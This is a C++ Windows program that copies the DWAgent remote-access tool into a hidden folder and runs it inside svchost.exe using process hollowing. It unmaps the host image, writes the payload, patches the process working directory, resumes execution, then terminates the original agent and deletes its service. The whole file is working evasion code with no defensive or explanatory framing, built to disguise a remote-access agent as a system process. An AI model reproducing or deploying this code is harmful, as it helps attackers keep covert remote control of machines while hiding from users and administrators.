#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <fstream>
#include <fileapi.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

// --- Global Logger ---
void Log(const std::string& message) {
    std::ofstream logFile("C:\\injector_log.txt", std::ios::app);
    if (logFile.is_open()) {
        logFile << "[LOG] " << message << " (Error: " << GetLastError() << ")" << std::endl;
        logFile.close();
    }
    std::cout << message << std::endl;
}

// --- Helper Prototypes ---
DWORD GetProcessIdByName(const char* processName);
bool CopyFolderRecursive(const std::string& source, const std::string& destination);
bool SetRemoteWorkingDirectory(HANDLE hProcess, const std::string& newDir);
void RunServiceCommand(const std::string& action);

/**
 * Part 1: Copy and Hide the Folder
 */
bool PrepareHiddenFolder(const std::string& src, const std::string& dst) {
    Log("Starting Folder Copy: " + src + " -> " + dst);
    
    if (!CopyFolderRecursive(src, dst)) {
        Log("[WARNING] Copy failed, using original folder.");
        return false;
    }

    // Set hidden attribute recursively
    SetFileAttributesA(dst.c_str(), FILE_ATTRIBUTE_HIDDEN);
    Log("[SUCCESS] Folder copied and hidden.");
    return true;
}

/**
 * Part 2: Process Hollowing with Working Directory Fix
 */
bool InjectWithHollowing(const std::string& payloadPath, const std::string& hostPath, const std::string& workingDir) {
    // 1. Read Payload
    std::ifstream file(payloadPath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) return false;
    size_t size = file.tellg();
    std::vector<BYTE> buffer(size);
    file.seekg(0, std::ios::beg);
    file.read((char*)buffer.data(), size);
    file.close();

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)buffer.data();
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(buffer.data() + dos->e_lfanew);

    // 2. Create Host Suspended
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessA(hostPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        Log("[ERROR] Failed to create host process.");
        return false;
    }

    Log("[HOST] Created suspended host: " + hostPath);

    // 3. Unmap and Reallocate
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    PVOID remoteBase = nullptr;
#ifdef _WIN64
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &remoteBase, sizeof(PVOID), NULL);
#else
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08), &remoteBase, sizeof(PVOID), NULL);
#endif

    auto NtUnmapViewOfSection = (long (NTAPI*)(HANDLE, PVOID))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    if (NtUnmapViewOfSection) NtUnmapViewOfSection(pi.hProcess, remoteBase);

    PVOID newBase = VirtualAllocEx(pi.hProcess, (PVOID)nt->OptionalHeader.ImageBase, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!newBase) newBase = VirtualAllocEx(pi.hProcess, NULL, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 4. Write Payload
    WriteProcessMemory(pi.hProcess, newBase, buffer.data(), nt->OptionalHeader.SizeOfHeaders, NULL);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess, (PVOID)((LPBYTE)newBase + section[i].VirtualAddress), 
                           (PVOID)(buffer.data() + section[i].PointerToRawData), section[i].SizeOfRawData, NULL);
    }

    // 5. CRITICAL: Set Working Directory in PEB
    if (!SetRemoteWorkingDirectory(pi.hProcess, workingDir)) {
        Log("[WARNING] Could not set remote working directory.");
    }

    // 6. Update Context and Resume
#ifdef _WIN64
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &newBase, sizeof(PVOID), NULL);
    ctx.Rcx = (DWORD64)newBase + nt->OptionalHeader.AddressOfEntryPoint;
#else
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08), &newBase, sizeof(PVOID), NULL);
    ctx.Eax = (DWORD)newBase + nt->OptionalHeader.AddressOfEntryPoint;
#endif

    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    Log("[INJECTED] Payload running in host thread.");
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

/**
 * Part 3 & 4: Cleanup and Verification
 */
void VerifyAndCleanup(DWORD originalPid) {
    Log("[WAITING] 30 seconds for stabilization...");
    Sleep(30000);

    // Terminate original
    if (originalPid != 0) {
        HANDLE hOriginal = OpenProcess(PROCESS_TERMINATE, FALSE, originalPid);
        if (hOriginal) {
            TerminateProcess(hOriginal, 0);
            CloseHandle(hOriginal);
            Log("[TERMINATED] Original dwagent.exe.");
        }
    }

    // Delete Service
    RunServiceCommand("stop");
    RunServiceCommand("delete");
    Log("[CLEANED] Service DWAgent removed.");

    // Verification
    Log("--- Verification ---");
    if (GetProcessIdByName("dwagent.exe") == 0) {
        Log("[VERIFY] dwagent.exe is NOT running as standalone: PASS");
    } else {
        Log("[VERIFY] dwagent.exe is still running: FAIL");
    }
}

int main() {
    std::string srcFolder = "C:\\Program Files\\DWAgent";
    std::string dstFolder = "C:\\Windows\\Temp\\DWAgent_Hidden";
    std::string payload = dstFolder + "\\runtime\\dwagent.exe";
    
    // Get PID before starting
    DWORD originalPid = GetProcessIdByName("dwagent.exe");

    // Part 1
    if (!PrepareHiddenFolder(srcFolder, dstFolder)) {
        payload = srcFolder + "\\runtime\\dwagent.exe"; // Fallback
    }

    // Part 2
    std::string host = "C:\\Windows\\System32\\svchost.exe";
    if (InjectWithHollowing(payload, host, dstFolder + "\\runtime\\")) {
        // Part 3 & 4
        VerifyAndCleanup(originalPid);
    } else {
        Log("[FATAL] Injection failed.");
    }

    return 0;
}

// --- Implementation Helpers ---

bool CopyFolderRecursive(const std::string& source, const std::string& destination) {
    CreateDirectoryA(destination.c_str(), NULL);
    std::string searchPath = source + "\\*";
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE) return false;

    do {
        if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
            std::string srcPath = source + "\\" + findData.cFileName;
            std::string dstPath = destination + "\\" + findData.cFileName;

            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                CopyFolderRecursive(srcPath, dstPath);
            } else {
                CopyFileA(srcPath.c_str(), dstPath.c_str(), FALSE);
                SetFileAttributesA(dstPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
            }
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);
    return true;
}

DWORD GetProcessIdByName(const char* processName) {
    DWORD processId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                processId = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processId;
}

void RunServiceCommand(const std::string& action) {
    std::string cmdLine = "cmd.exe /c sc " + action + " DWAgent";
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    char cmd[MAX_PATH];
    strcpy_s(cmd, cmdLine.c_str());
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

/**
 * Sets the Working Directory in the remote process PEB.
 */
bool SetRemoteWorkingDirectory(HANDLE hProcess, const std::string& newDir) {
    typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    _NtQueryInformationProcess NtQueryInfo = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

    PROCESS_BASIC_INFORMATION pbi;
    if (NtQueryInfo(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL) != 0) return false;

    // Get ProcessParameters pointer from PEB
    PVOID peb = pbi.PebBaseAddress;
    PVOID procParams = nullptr;
    SIZE_T offset = 0;

#ifdef _WIN64
    offset = 0x20; // x64 ProcessParameters offset
#else
    offset = 0x10; // x86 ProcessParameters offset
#endif

    if (!ReadProcessMemory(hProcess, (PVOID)((BYTE*)peb + offset), &procParams, sizeof(PVOID), NULL)) return false;

    // CurrentDirectory is at offset 0x38 in RTL_USER_PROCESS_PARAMETERS (x64)
    // It is a UNICODE_STRING
    SIZE_T dirOffset = 0;
#ifdef _WIN64
    dirOffset = 0x38;
#else
    dirOffset = 0x24;
#endif

    // Convert path to WideChar
    std::wstring wDir(newDir.begin(), newDir.end());
    PVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, (wDir.length() + 1) * sizeof(wchar_t), MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, remoteBuffer, wDir.c_str(), wDir.length() * sizeof(wchar_t), NULL);

    // Write back to the UNICODE_STRING struct in the target
    USHORT len = (USHORT)(wDir.length() * sizeof(wchar_t));
    WriteProcessMemory(hProcess, (PVOID)((BYTE*)procParams + dirOffset), &len, sizeof(USHORT), NULL); // Length
    WriteProcessMemory(hProcess, (PVOID)((BYTE*)procParams + dirOffset + 2), &len, sizeof(USHORT), NULL); // MaxLength
    WriteProcessMemory(hProcess, (PVOID)((BYTE*)procParams + dirOffset + (sizeof(PVOID) == 8 ? 8 : 4)), &remoteBuffer, sizeof(PVOID), NULL); // Buffer

    return true;
}